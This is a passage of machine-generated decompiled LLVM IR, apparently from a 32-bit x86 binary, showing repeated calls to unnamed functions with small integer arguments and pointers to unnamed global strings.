  %v2_80487c3 = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_80487c3, i32* %eax.global-to-local, align 4
  %v0_80487c8 = load i32, i32* @esp, align 4
  %v1_80487c8 = inttoptr i32 %v0_80487c8 to i32*
  %v2_80487c8 = load i32, i32* %v1_80487c8, align 4
  store i32 %v2_80487c8, i32* %edx.global-to-local, align 4
  %v3_80487c8 = add i32 %v0_80487c8, 4
  %v1_80487c9 = inttoptr i32 %v3_80487c8 to i32*
  %v2_80487c9 = load i32, i32* %v1_80487c9, align 4
  store i32 %v2_80487c9, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_80554af.8 to i32), i32* %v1_80487c9, align 4
  %v1_80487cf = add i32 %v0_80487c8, 10388
  store i32 %v1_80487cf, i32* %edx.global-to-local, align 4
  %v2_80487d6 = add i32 %v1_80487cf, %v2_80487c3
  store i32 %v2_80487d6, i32* %eax.global-to-local, align 4
  store i32 %v2_80487d6, i32* %v1_80487c8, align 4
  %v3_80487da = call i32 @function_8052640(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80487da, i32* %eax.global-to-local, align 4
  %v0_80487df = load i32, i32* @esp, align 4
  %v1_80487df = inttoptr i32 %v0_80487df to i32*
  %v2_80487df = load i32, i32* %v1_80487df, align 4
  store i32 %v2_80487df, i32* @ebx, align 4
  %v1_80487e0 = add i32 %v0_80487df, 10388
  store i32 %v1_80487e0, i32* %ecx.global-to-local, align 4
  store i32 %v1_80487e0, i32* %v1_80487df, align 4
  %v2_80487e8 = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_80487e8, i32* %eax.global-to-local, align 4
  %v0_80487ed = load i32, i32* @esp, align 4
  %v1_80487ed = inttoptr i32 %v0_80487ed to i32*
  %v3_80487ed = add i32 %v0_80487ed, 4
  %v0_80487ee = load i32, i32* @edi, align 4
  %v1_80487ee = add i32 %v0_80487ee, 20
  store i32 %v1_80487ee, i32* %edx.global-to-local, align 4
  %v1_80487f1 = inttoptr i32 %v3_80487ed to i32*
  %v2_80487f1 = load i32, i32* %v1_80487f1, align 4
  store i32 %v2_80487f1, i32* %ecx.global-to-local, align 4
  store i32 %v1_80487ee, i32* %v1_80487f1, align 4
  %v1_80487f3 = add i32 %v0_80487ed, 10388
  store i32 %v1_80487f3, i32* %edx.global-to-local, align 4
  %v2_80487fa = add i32 %v1_80487f3, %v2_80487e8
  store i32 %v2_80487fa, i32* %eax.global-to-local, align 4
  store i32 %v2_80487fa, i32* %v1_80487ed, align 4
  %v3_80487fe = call i32 @function_8052640(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80487fe, i32* %eax.global-to-local, align 4
  %v0_8048803 = load i32, i32* @esp, align 4
  %v1_8048803 = inttoptr i32 %v0_8048803 to i32*
  %v2_8048803 = load i32, i32* %v1_8048803, align 4
  store i32 %v2_8048803, i32* @ebx, align 4
  %v1_8048804 = add i32 %v0_8048803, 10388
  store i32 %v1_8048804, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048804, i32* %v1_8048803, align 4
  %v2_804880c = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_804880c, i32* %eax.global-to-local, align 4
  %v0_8048811 = load i32, i32* @esp, align 4
  %v1_8048811 = inttoptr i32 %v0_8048811 to i32*
  %v2_8048811 = load i32, i32* %v1_8048811, align 4
  store i32 %v2_8048811, i32* %edx.global-to-local, align 4
  %v3_8048811 = add i32 %v0_8048811, 4
  %v1_8048812 = inttoptr i32 %v3_8048811 to i32*
  %v2_8048812 = load i32, i32* %v1_8048812, align 4
  store i32 %v2_8048812, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_80554c7.9 to i32), i32* %v1_8048812, align 4
  %v1_8048818 = add i32 %v0_8048811, 10388
  store i32 %v1_8048818, i32* %edx.global-to-local, align 4
  %v2_804881f = add i32 %v1_8048818, %v2_804880c
  store i32 %v2_804881f, i32* %eax.global-to-local, align 4
  store i32 %v2_804881f, i32* %v1_8048811, align 4
  %v3_8048823 = call i32 @function_8052640(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048823, i32* %eax.global-to-local, align 4
  %v0_8048828 = load i32, i32* @esp, align 4
  %v1_8048828 = inttoptr i32 %v0_8048828 to i32*
  %v2_8048828 = load i32, i32* %v1_8048828, align 4
  store i32 %v2_8048828, i32* @ebx, align 4
  %v1_8048829 = add i32 %v0_8048828, 10388
  store i32 %v1_8048829, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048829, i32* %v1_8048828, align 4
  %v2_8048831 = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_8048831, i32* %eax.global-to-local, align 4
  %v0_8048836 = load i32, i32* @esp, align 4
  %v1_8048836 = inttoptr i32 %v0_8048836 to i32*
  %v3_8048836 = add i32 %v0_8048836, 4
  %v0_8048837 = load i32, i32* @edi, align 4
  %v1_8048837 = add i32 %v0_8048837, 789
  store i32 %v1_8048837, i32* %edx.global-to-local, align 4
  %v1_804883d = inttoptr i32 %v3_8048836 to i32*
  %v2_804883d = load i32, i32* %v1_804883d, align 4
  store i32 %v2_804883d, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048837, i32* %v1_804883d, align 4
  %v1_804883f = add i32 %v0_8048836, 10388
  store i32 %v1_804883f, i32* %edx.global-to-local, align 4
  %v2_8048846 = add i32 %v1_804883f, %v2_8048831
  store i32 %v2_8048846, i32* %eax.global-to-local, align 4
  store i32 %v2_8048846, i32* %v1_8048836, align 4
  %v3_804884a = call i32 @function_8052640(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804884a, i32* %eax.global-to-local, align 4
  %v0_804884f = load i32, i32* @esp, align 4
  %v1_804884f = inttoptr i32 %v0_804884f to i32*
  %v2_804884f = load i32, i32* %v1_804884f, align 4
  store i32 %v2_804884f, i32* %eax.global-to-local, align 4
  %v1_8048850 = add i32 %v0_804884f, 10388
  store i32 %v1_8048850, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048850, i32* %v1_804884f, align 4
  %v2_8048858 = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_8048858, i32* %eax.global-to-local, align 4
  %v0_804885d = load i32, i32* @esp, align 4
  %v1_804885d = inttoptr i32 %v0_804885d to i32*
  %v2_804885d = load i32, i32* %v1_804885d, align 4
  store i32 %v2_804885d, i32* %ecx.global-to-local, align 4
  %v3_804885d = add i32 %v0_804885d, 4
  %v1_804885e = inttoptr i32 %v3_804885d to i32*
  %v2_804885e = load i32, i32* %v1_804885e, align 4
  store i32 %v2_804885e, i32* @ebx, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_80554e6.10 to i32), i32* %v1_804885e, align 4
  %v1_8048864 = add i32 %v0_804885d, 10388
  store i32 %v1_8048864, i32* %edx.global-to-local, align 4
  %v2_804886b = add i32 %v1_8048864, %v2_8048858
  store i32 %v2_804886b, i32* %eax.global-to-local, align 4
  store i32 %v2_804886b, i32* %v1_804885d, align 4
  %v3_804886f = call i32 @function_8052640(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804886f, i32* %eax.global-to-local, align 4
  %v0_8048874 = load i32, i32* @esp, align 4
  %v1_8048874 = inttoptr i32 %v0_8048874 to i32*
  store i32 32, i32* %v1_8048874, align 4
  %v2_804887b = call i32 @function_8051cd0(i8 %v1_804887b)
  store i32 %v2_804887b, i32* %eax.global-to-local, align 4
  %v0_8048880 = load i32, i32* @esp, align 4
  %v1_8048880 = inttoptr i32 %v0_8048880 to i32*
  %v2_8048880 = load i32, i32* %v1_8048880, align 4
  store i32 %v2_8048880, i32* %eax.global-to-local, align 4
  %v3_8048880 = add i32 %v0_8048880, 4
  %v1_8048881 = inttoptr i32 %v3_8048880 to i32*
  %v2_8048881 = load i32, i32* %v1_8048881, align 4
  store i32 %v2_8048881, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_8048881, align 4
  store i32 32, i32* %v1_8048880, align 4
  %v3_8048886 = call i32 @function_8051c20(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048886, i32* %eax.global-to-local, align 4
  store i32 %v3_8048886, i32* @ebx, align 4
  %v0_804888d = load i32, i32* @esp, align 4
  %v1_804888d = inttoptr i32 %v0_804888d to i32*
  %v2_804888d = load i32, i32* %v1_804888d, align 4
  store i32 %v2_804888d, i32* %eax.global-to-local, align 4
  %v1_804888e = add i32 %v0_804888d, 10388
  store i32 %v1_804888e, i32* %ecx.global-to-local, align 4
  store i32 %v1_804888e, i32* %v1_804888d, align 4
  %v2_8048896 = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_8048896, i32* %eax.global-to-local, align 4
  %v0_804889b = load i32, i32* @esp, align 4
  %v1_804889b = inttoptr i32 %v0_804889b to i32*
  %v2_804889b = load i32, i32* %v1_804889b, align 4
  store i32 %v2_804889b, i32* %edx.global-to-local, align 4
  %v3_804889b = add i32 %v0_804889b, 4
  %v1_804889c = inttoptr i32 %v3_804889b to i32*
  %v2_804889c = load i32, i32* %v1_804889c, align 4
  store i32 %v2_804889c, i32* %ecx.global-to-local, align 4
  %v0_804889d = load i32, i32* @ebx, align 4
  store i32 %v0_804889d, i32* %v1_804889c, align 4
  %v1_804889e = add i32 %v0_804889b, 10388
  store i32 %v1_804889e, i32* %edx.global-to-local, align 4
  %v2_80488a5 = add i32 %v1_804889e, %v2_8048896
  store i32 %v2_80488a5, i32* %eax.global-to-local, align 4
  store i32 %v2_80488a5, i32* %v1_804889b, align 4
  %v3_80488a9 = call i32 @function_8052640(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80488a9, i32* %eax.global-to-local, align 4
  %v0_80488ae = load i32, i32* @esp, align 4
  %v1_80488ae = inttoptr i32 %v0_80488ae to i32*
  store i32 32, i32* %v1_80488ae, align 4
  %v2_80488b5 = call i32 @function_8051c50(i8 %v1_804887b)
  store i32 %v2_80488b5, i32* %eax.global-to-local, align 4
  %v0_80488ba = load i32, i32* @esp, align 4
  %v1_80488ba = inttoptr i32 %v0_80488ba to i32*
  %v2_80488ba = load i32, i32* %v1_80488ba, align 4
  store i32 %v2_80488ba, i32* %eax.global-to-local, align 4
  %v1_80488bb = add i32 %v0_80488ba, 10388
  store i32 %v1_80488bb, i32* %ecx.global-to-local, align 4
  store i32 %v1_80488bb, i32* %v1_80488ba, align 4
  %v2_80488c3 = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_80488c3, i32* %eax.global-to-local, align 4
  %v0_80488c8 = load i32, i32* @esp, align 4
  %v1_80488c8 = inttoptr i32 %v0_80488c8 to i32*
  %v2_80488c8 = load i32, i32* %v1_80488c8, align 4
  store i32 %v2_80488c8, i32* %ecx.global-to-local, align 4
  %v3_80488c8 = add i32 %v0_80488c8, 4
  %v1_80488c9 = inttoptr i32 %v3_80488c8 to i32*
  %v2_80488c9 = load i32, i32* %v1_80488c9, align 4
  store i32 %v2_80488c9, i32* @ebx, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_80554e6.10 to i32), i32* %v1_80488c9, align 4
  %v1_80488cf = add i32 %v0_80488c8, 10388
  store i32 %v1_80488cf, i32* %edx.global-to-local, align 4
  %v2_80488d6 = add i32 %v1_80488cf, %v2_80488c3
  store i32 %v2_80488d6, i32* %eax.global-to-local, align 4
  store i32 %v2_80488d6, i32* %v1_80488c8, align 4
  %v3_80488da = call i32 @function_8052640(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80488da, i32* %eax.global-to-local, align 4
  %v0_80488df = load i32, i32* @esp, align 4
  %v1_80488df = inttoptr i32 %v0_80488df to i32*
  store i32 33, i32* %v1_80488df, align 4
  %v2_80488e6 = call i32 @function_8051cd0(i8 %v1_804887b)
  store i32 %v2_80488e6, i32* %eax.global-to-local, align 4
  %v0_80488eb = load i32, i32* @esp, align 4
  %v1_80488eb = inttoptr i32 %v0_80488eb to i32*
  %v2_80488eb = load i32, i32* %v1_80488eb, align 4
  store i32 %v2_80488eb, i32* %eax.global-to-local, align 4
  %v3_80488eb = add i32 %v0_80488eb, 4
  %v1_80488ec = inttoptr i32 %v3_80488eb to i32*
  %v2_80488ec = load i32, i32* %v1_80488ec, align 4
  store i32 %v2_80488ec, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_80488ec, align 4
  store i32 33, i32* %v1_80488eb, align 4
  %v3_80488f1 = call i32 @function_8051c20(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_80488f1, i32* %eax.global-to-local, align 4
  store i32 %v3_80488f1, i32* @ebx, align 4
  %v0_80488f8 = load i32, i32* @esp, align 4
  %v1_80488f8 = inttoptr i32 %v0_80488f8 to i32*
  %v2_80488f8 = load i32, i32* %v1_80488f8, align 4
  store i32 %v2_80488f8, i32* %eax.global-to-local, align 4
  %v1_80488f9 = add i32 %v0_80488f8, 10388
  store i32 %v1_80488f9, i32* %ecx.global-to-local, align 4
  store i32 %v1_80488f9, i32* %v1_80488f8, align 4
  %v2_8048901 = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_8048901, i32* %eax.global-to-local, align 4
  %v0_8048906 = load i32, i32* @esp, align 4
  %v1_8048906 = inttoptr i32 %v0_8048906 to i32*
  %v2_8048906 = load i32, i32* %v1_8048906, align 4
  store i32 %v2_8048906, i32* %edx.global-to-local, align 4
  %v3_8048906 = add i32 %v0_8048906, 4
  %v1_8048907 = inttoptr i32 %v3_8048906 to i32*
  %v2_8048907 = load i32, i32* %v1_8048907, align 4
  store i32 %v2_8048907, i32* %ecx.global-to-local, align 4
  %v0_8048908 = load i32, i32* @ebx, align 4
  store i32 %v0_8048908, i32* %v1_8048907, align 4
  %v1_8048909 = add i32 %v0_8048906, 10388
  store i32 %v1_8048909, i32* %edx.global-to-local, align 4
  %v2_8048910 = add i32 %v1_8048909, %v2_8048901
  store i32 %v2_8048910, i32* %eax.global-to-local, align 4
  store i32 %v2_8048910, i32* %v1_8048906, align 4
  %v3_8048914 = call i32 @function_8052640(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048914, i32* %eax.global-to-local, align 4
  %v0_8048919 = load i32, i32* @esp, align 4
  %v1_8048919 = inttoptr i32 %v0_8048919 to i32*
  store i32 33, i32* %v1_8048919, align 4
  %v2_8048920 = call i32 @function_8051c50(i8 %v1_804887b)
  store i32 %v2_8048920, i32* %eax.global-to-local, align 4
  %v0_8048925 = load i32, i32* @esp, align 4
  %v1_8048925 = inttoptr i32 %v0_8048925 to i32*
  %v2_8048925 = load i32, i32* %v1_8048925, align 4
  store i32 %v2_8048925, i32* %eax.global-to-local, align 4
  %v1_8048926 = add i32 %v0_8048925, 10388
  store i32 %v1_8048926, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048926, i32* %v1_8048925, align 4
  %v2_804892e = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_804892e, i32* %eax.global-to-local, align 4
  %v0_8048933 = load i32, i32* @esp, align 4
  %v1_8048933 = inttoptr i32 %v0_8048933 to i32*
  %v2_8048933 = load i32, i32* %v1_8048933, align 4
  store i32 %v2_8048933, i32* %ecx.global-to-local, align 4
  %v3_8048933 = add i32 %v0_8048933, 4
  %v1_8048934 = inttoptr i32 %v3_8048933 to i32*
  %v2_8048934 = load i32, i32* %v1_8048934, align 4
  store i32 %v2_8048934, i32* @ebx, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_80554e6.10 to i32), i32* %v1_8048934, align 4
  %v1_804893a = add i32 %v0_8048933, 10388
  store i32 %v1_804893a, i32* %edx.global-to-local, align 4
  %v2_8048941 = add i32 %v1_804893a, %v2_804892e
  store i32 %v2_8048941, i32* %eax.global-to-local, align 4
  store i32 %v2_8048941, i32* %v1_8048933, align 4
  %v3_8048945 = call i32 @function_8052640(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048945, i32* %eax.global-to-local, align 4
  %v0_804894a = load i32, i32* @esp, align 4
  %v1_804894a = inttoptr i32 %v0_804894a to i32*
  store i32 34, i32* %v1_804894a, align 4
  %v2_8048951 = call i32 @function_8051cd0(i8 %v1_804887b)
  store i32 %v2_8048951, i32* %eax.global-to-local, align 4
  %v0_8048956 = load i32, i32* @esp, align 4
  %v1_8048956 = inttoptr i32 %v0_8048956 to i32*
  %v2_8048956 = load i32, i32* %v1_8048956, align 4
  store i32 %v2_8048956, i32* %eax.global-to-local, align 4
  %v3_8048956 = add i32 %v0_8048956, 4
  %v1_8048957 = inttoptr i32 %v3_8048956 to i32*
  %v2_8048957 = load i32, i32* %v1_8048957, align 4
  store i32 %v2_8048957, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_8048957, align 4
  store i32 34, i32* %v1_8048956, align 4
  %v3_804895c = call i32 @function_8051c20(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_804895c, i32* %eax.global-to-local, align 4
  store i32 %v3_804895c, i32* @ebx, align 4
  %v0_8048963 = load i32, i32* @esp, align 4
  %v1_8048963 = inttoptr i32 %v0_8048963 to i32*
  %v2_8048963 = load i32, i32* %v1_8048963, align 4
  store i32 %v2_8048963, i32* %eax.global-to-local, align 4
  %v1_8048964 = add i32 %v0_8048963, 10388
  store i32 %v1_8048964, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048964, i32* %v1_8048963, align 4
  %v2_804896c = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_804896c, i32* %eax.global-to-local, align 4
  %v0_8048971 = load i32, i32* @esp, align 4
  %v1_8048971 = inttoptr i32 %v0_8048971 to i32*
  %v2_8048971 = load i32, i32* %v1_8048971, align 4
  store i32 %v2_8048971, i32* %edx.global-to-local, align 4
  %v3_8048971 = add i32 %v0_8048971, 4
  %v1_8048972 = inttoptr i32 %v3_8048971 to i32*
  %v2_8048972 = load i32, i32* %v1_8048972, align 4
  store i32 %v2_8048972, i32* %ecx.global-to-local, align 4
  %v0_8048973 = load i32, i32* @ebx, align 4
  store i32 %v0_8048973, i32* %v1_8048972, align 4
  %v1_8048974 = add i32 %v0_8048971, 10388
  store i32 %v1_8048974, i32* %edx.global-to-local, align 4
  %v2_804897b = add i32 %v1_8048974, %v2_804896c
  store i32 %v2_804897b, i32* %eax.global-to-local, align 4
  store i32 %v2_804897b, i32* %v1_8048971, align 4
  %v3_804897f = call i32 @function_8052640(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804897f, i32* %eax.global-to-local, align 4
  %v0_8048984 = load i32, i32* @esp, align 4
  %v1_8048984 = inttoptr i32 %v0_8048984 to i32*
  store i32 34, i32* %v1_8048984, align 4
  %v2_804898b = call i32 @function_8051c50(i8 %v1_804887b)
  store i32 %v2_804898b, i32* %eax.global-to-local, align 4
  %v0_8048990 = load i32, i32* @esp, align 4
  %v1_8048990 = inttoptr i32 %v0_8048990 to i32*
  %v1_8048991 = add i32 %v0_8048990, 10388
  store i32 %v1_8048991, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048991, i32* %v1_8048990, align 4
  %v2_8048999 = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_8048999, i32* %eax.global-to-local, align 4
  %v0_804899e = load i32, i32* @esp, align 4
  %v1_804899e = inttoptr i32 %v0_804899e to i32*
  %v2_804899e = load i32, i32* %v1_804899e, align 4
  store i32 %v2_804899e, i32* @ebx, align 4
  %v3_804899e = add i32 %v0_804899e, 4
  %v1_804899f = inttoptr i32 %v3_804899e to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80554e6.10 to i32), i32* %v1_804899f, align 4
  %v1_80489a5 = add i32 %v0_804899e, 10388
  store i32 %v1_80489a5, i32* %edx.global-to-local, align 4
  %v2_80489ac = add i32 %v1_80489a5, %v2_8048999
  store i32 %v2_80489ac, i32* %eax.global-to-local, align 4
  store i32 %v2_80489ac, i32* %v1_804899e, align 4
  %v3_80489b0 = call i32 @function_8052640(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80489b0, i32* %eax.global-to-local, align 4
  %v0_80489b5 = load i32, i32* @esp, align 4
  %v1_80489b5 = add i32 %v0_80489b5, 16
  %v1_80489b8 = add i32 %v0_80489b5, 68
  %v2_80489b8 = inttoptr i32 %v1_80489b8 to i32*
  %v3_80489b8 = load i32, i32* %v2_80489b8, align 4
  store i32 %v3_80489b8, i32* %ecx.global-to-local, align 4
  %v1_80489bc = icmp eq i32 %v3_80489b8, 0
  store i1 %v1_80489bc, i1* %zf.global-to-local, align 1
  br i1 %v1_80489bc, label %dec_label_pc_8048ad8, label %dec_label_pc_80489c4

dec_label_pc_80489c4:                             ; preds = %dec_label_pc_8048700
  %v9_80489c4 = icmp eq i32 %v0_80489b5, -4
  store i1 %v9_80489c4, i1* %zf.global-to-local, align 1
  %v2_80489c7 = inttoptr i32 %v0_80489b5 to i32*
  store i32 35, i32* %v2_80489c7, align 4
  %v2_80489c9 = call i32 @function_8051cd0(i8 %v1_804887b)
  store i32 %v2_80489c9, i32* %eax.global-to-local, align 4
  %v0_80489ce = load i32, i32* @esp, align 4
  %v1_80489ce = inttoptr i32 %v0_80489ce to i32*
  %v2_80489ce = load i32, i32* %v1_80489ce, align 4
  store i32 %v2_80489ce, i32* %eax.global-to-local, align 4
  %v3_80489ce = add i32 %v0_80489ce, 4
  %v1_80489cf = inttoptr i32 %v3_80489ce to i32*
  %v2_80489cf = load i32, i32* %v1_80489cf, align 4
  store i32 %v2_80489cf, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_80489cf, align 4
  store i32 35, i32* %v1_80489ce, align 4
  %v3_80489d4 = call i32 @function_8051c20(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_80489d4, i32* %eax.global-to-local, align 4
  store i32 %v3_80489d4, i32* @ebx, align 4
  %v0_80489db = load i32, i32* @esp, align 4
  %v1_80489db = inttoptr i32 %v0_80489db to i32*
  %v2_80489db = load i32, i32* %v1_80489db, align 4
  store i32 %v2_80489db, i32* %eax.global-to-local, align 4
  %v1_80489dc = add i32 %v0_80489db, 10388
  store i32 %v1_80489dc, i32* %ecx.global-to-local, align 4
  store i32 %v1_80489dc, i32* %v1_80489db, align 4
  %v2_80489e4 = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_80489e4, i32* %eax.global-to-local, align 4
  %v0_80489e9 = load i32, i32* @esp, align 4
  %v1_80489e9 = inttoptr i32 %v0_80489e9 to i32*
  %v2_80489e9 = load i32, i32* %v1_80489e9, align 4
  store i32 %v2_80489e9, i32* %edx.global-to-local, align 4
  %v3_80489e9 = add i32 %v0_80489e9, 4
  %v1_80489ea = inttoptr i32 %v3_80489e9 to i32*
  %v2_80489ea = load i32, i32* %v1_80489ea, align 4
  store i32 %v2_80489ea, i32* %ecx.global-to-local, align 4
  %v0_80489eb = load i32, i32* @ebx, align 4
  store i32 %v0_80489eb, i32* %v1_80489ea, align 4
  %v1_80489ec = add i32 %v0_80489e9, 10388
  store i32 %v1_80489ec, i32* %edx.global-to-local, align 4
  %v2_80489f3 = add i32 %v1_80489ec, %v2_80489e4
  store i32 %v2_80489f3, i32* %eax.global-to-local, align 4
  store i32 %v2_80489f3, i32* %v1_80489e9, align 4
  %v3_80489f7 = call i32 @function_8052640(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80489f7, i32* %eax.global-to-local, align 4
  %v0_80489fc = load i32, i32* @esp, align 4
  %v1_80489fc = inttoptr i32 %v0_80489fc to i32*
  store i32 35, i32* %v1_80489fc, align 4
  %v2_8048a03 = call i32 @function_8051c50(i8 %v1_804887b)
  store i32 %v2_8048a03, i32* %eax.global-to-local, align 4
  %v0_8048a08 = load i32, i32* @esp, align 4
  %v1_8048a08 = inttoptr i32 %v0_8048a08 to i32*
  %v2_8048a08 = load i32, i32* %v1_8048a08, align 4
  store i32 %v2_8048a08, i32* %eax.global-to-local, align 4
  %v1_8048a09 = add i32 %v0_8048a08, 10388
  store i32 %v1_8048a09, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048a09, i32* %v1_8048a08, align 4
  %v2_8048a11 = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_8048a11, i32* %eax.global-to-local, align 4
  %v0_8048a16 = load i32, i32* @esp, align 4
  %v1_8048a16 = inttoptr i32 %v0_8048a16 to i32*
  %v2_8048a16 = load i32, i32* %v1_8048a16, align 4
  store i32 %v2_8048a16, i32* %ecx.global-to-local, align 4
  %v3_8048a16 = add i32 %v0_8048a16, 4
  %v1_8048a17 = inttoptr i32 %v3_8048a16 to i32*
  %v2_8048a17 = load i32, i32* %v1_8048a17, align 4
  store i32 %v2_8048a17, i32* @ebx, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_80554e6.10 to i32), i32* %v1_8048a17, align 4
  %v1_8048a1d = add i32 %v0_8048a16, 10388
  store i32 %v1_8048a1d, i32* %edx.global-to-local, align 4
  %v2_8048a24 = add i32 %v1_8048a1d, %v2_8048a11
  store i32 %v2_8048a24, i32* %eax.global-to-local, align 4
  store i32 %v2_8048a24, i32* %v1_8048a16, align 4
  %v3_8048a28 = call i32 @function_8052640(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048a28, i32* %eax.global-to-local, align 4
  %v0_8048a2d = load i32, i32* @esp, align 4
  %v1_8048a2d = inttoptr i32 %v0_8048a2d to i32*
  %v2_8048a2d = load i32, i32* %v1_8048a2d, align 4
  store i32 %v2_8048a2d, i32* %eax.global-to-local, align 4
  %v3_8048a2d = add i32 %v0_8048a2d, 4
  %v1_8048a2e = inttoptr i32 %v3_8048a2d to i32*
  %v2_8048a2e = load i32, i32* %v1_8048a2e, align 4
  store i32 %v2_8048a2e, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_8048a2e, align 4
  store i32 40, i32* %v1_8048a2d, align 4
  %v3_8048a33 = call i32 @function_8051c20(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048a33, i32* %eax.global-to-local, align 4
  store i32 %v3_8048a33, i32* @ebx, align 4
  %v0_8048a3a = load i32, i32* @esp, align 4
  %v1_8048a3a = inttoptr i32 %v0_8048a3a to i32*
  %v2_8048a3a = load i32, i32* %v1_8048a3a, align 4
  store i32 %v2_8048a3a, i32* %eax.global-to-local, align 4
  %v1_8048a3b = add i32 %v0_8048a3a, 10388
  store i32 %v1_8048a3b, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048a3b, i32* %v1_8048a3a, align 4
  %v2_8048a43 = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_8048a43, i32* %eax.global-to-local, align 4
  %v0_8048a48 = load i32, i32* @esp, align 4
  %v1_8048a48 = inttoptr i32 %v0_8048a48 to i32*
  %v2_8048a48 = load i32, i32* %v1_8048a48, align 4
  store i32 %v2_8048a48, i32* %edx.global-to-local, align 4
  %v3_8048a48 = add i32 %v0_8048a48, 4
  %v1_8048a49 = inttoptr i32 %v3_8048a48 to i32*
  %v2_8048a49 = load i32, i32* %v1_8048a49, align 4
  store i32 %v2_8048a49, i32* %ecx.global-to-local, align 4
  %v0_8048a4a = load i32, i32* @ebx, align 4
  store i32 %v0_8048a4a, i32* %v1_8048a49, align 4
  %v1_8048a4b = add i32 %v0_8048a48, 10388
  store i32 %v1_8048a4b, i32* %edx.global-to-local, align 4
  %v2_8048a52 = add i32 %v1_8048a4b, %v2_8048a43
  store i32 %v2_8048a52, i32* %eax.global-to-local, align 4
  store i32 %v2_8048a52, i32* %v1_8048a48, align 4
  %v3_8048a56 = call i32 @function_8052640(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048a56, i32* %eax.global-to-local, align 4
  %v0_8048a5b = load i32, i32* @esp, align 4
  %v1_8048a5b = inttoptr i32 %v0_8048a5b to i32*
  %v2_8048a5b = load i32, i32* %v1_8048a5b, align 4
  store i32 %v2_8048a5b, i32* @ebx, align 4
  %v1_8048a5c = add i32 %v0_8048a5b, 10388
  store i32 %v1_8048a5c, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048a5c, i32* %v1_8048a5b, align 4
  %v2_8048a64 = call i32 @function_8052620(i8* %v1_8048752)
  store i32 %v2_8048a64, i32* %eax.global-to-local, align 4
  %v0_8048a69 = load i32, i32* @esp, align 4
  %v1_8048a69 = inttoptr i32 %v0_8048a69 to i32*
  %v2_8048a69 = load i32, i32* %v1_8048a69, align 4
  store i32 %v2_8048a69, i32* %edx.global-to-local, align 4
  %v3_8048a69 = add i32 %v0_8048a69, 4
  %v1_8048a6a = inttoptr i32 %v3_8048a69 to i32*
  %v2_8048a6a = load i32, i32* %v1_8048a6a, align 4
  store i32 %v2_8048a6a, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80554df.7 to i32), i32* %v1_8048a6a, align 4
  %v1_8048a70 = add i32 %v0_8048a69, 10388
  store i32 %v1_8048a70, i32* %edx.global-to-local, align 4
  %v2_8048a77 = add i32 %v1_8048a70, %v2_8048a64
  store i32 %v2_8048a77, i32* %eax.global-to-local, align 4
  store i32 %v2_8048a77, i32* %v1_8048a69, align 4
  %v3_8048a7b = call i32 @function_8052640(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048a7b, i32* %eax.global-to-local, align 4
  %v0_8048a80 = load i32, i32* @esp, align 4
  %v1_8048a80 = inttoptr i32 %v0_8048a80 to i32*
  %v2_8048a80 = load i32, i32* %v1_8048a80, align 4
  store i32 %v2_8048a80, i32* %eax.global-to-local, align 4
